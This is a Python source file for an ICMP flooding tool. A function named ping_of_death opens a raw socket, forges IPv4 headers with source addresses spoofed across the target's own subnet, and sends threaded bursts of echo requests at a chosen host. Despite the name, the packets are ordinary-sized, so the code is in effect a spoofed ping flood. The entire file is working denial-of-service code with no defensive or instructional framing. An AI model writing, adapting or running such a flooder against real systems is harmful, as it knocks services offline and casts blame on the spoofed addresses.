from random import randrange
import socket
import struct
import sys
import threading

from utils.packet import ICMP_STRUCT, IPv4_STRUCT
from utils.checksum import checksum


def make_ip_pkt(src_addr, dest_addr, hdr_checksum=0):
    #ip field variables
    ver = 4
    ihl = 5
    ihl_ver = (ver << 4) + ihl
    tos = 0
    total_len = 20 + 8 + 64
    ip_id = 0
    frag_offset = 0
    ttl = 255
    proto = socket.IPPROTO_ICMP
    src_ip = socket.inet_aton(src_addr)
    dest_ip = socket.inet_aton(dest_addr)
    return IPv4_STRUCT.pack(ihl_ver, tos, total_len, ip_id, frag_offset,
                            ttl, proto, hdr_checksum, src_ip, dest_ip)


def make_icmp_pkt(icmp_id, icmp_seq_num, icmp_checksum=0):
    #icmp field variables
    icmp_type = 8
    icmp_code = 0
    icmp_msg = "X"*60
    icmp_msg_len = len(icmp_msg)
    icmp_pkt = ICMP_STRUCT.pack(icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq_num)
    icmp_pkt += struct.pack("!{}s".format(icmp_msg_len), icmp_msg.encode())
    return icmp_pkt


def send_burst(sock, dest_ip, burst=50):
    icmp_id = randrange(0, 255)
    icmp_seq_num = 0
    src_ip_base = ".".join(dest_ip.split(".")[:-1])
    for j in range(1, burst):
        for l in range(1, 255):
            src_ip = str(src_ip_base + ".{}".format(l))
            ip_pkt = make_ip_pkt(src_ip, dest_ip)
            icmp_pkt = make_icmp_pkt(icmp_id, icmp_seq_num)
            
            ip_checksum = checksum(ip_pkt + icmp_pkt)
            icmp_checksum = checksum(icmp_pkt)

            ip_pkt = make_ip_pkt(src_ip, dest_ip, ip_checksum)
            icmp_pkt = make_icmp_pkt(icmp_id, icmp_seq_num, icmp_checksum=icmp_checksum)

            pkt = ip_pkt + icmp_pkt
            icmp_seq_num += 1
            sock.sendto(pkt, (dest_ip, 0))


def ping_of_death(dest_ip, iterations=2, burst=5, thread_num=2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    def make_burst():
        for i in range(iterations):
            try:
                send_burst(sock, dest_ip, burst=burst)
            except socket.error as err:
                print(f"ERROR: {err}")
                break
        return
    
    if thread_num > 0:
        threads = []
        for _ in range(thread_num):
            t = threading.Thread(target=make_burst)
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()


